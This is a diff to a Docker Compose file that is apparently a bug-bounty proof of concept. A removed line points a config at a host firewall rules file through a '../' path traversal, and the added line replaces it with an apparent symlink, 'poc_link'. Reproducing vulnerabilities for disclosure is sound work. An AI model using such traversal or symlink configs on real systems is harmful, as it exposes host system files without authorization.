@@ -1,3 +1,14 @@
+services:
+  app:
+    build: .
+    image: bb-poc-app
+    ports:
+      - "8080:8080"
+    environment:
+      - PORT=8080
+    configs:
+      - poc_config
+
 configs:
   poc_config:
-    file: "./ignored/../../../../../../etc/ufw/user6.rules"
+    file: poc_link
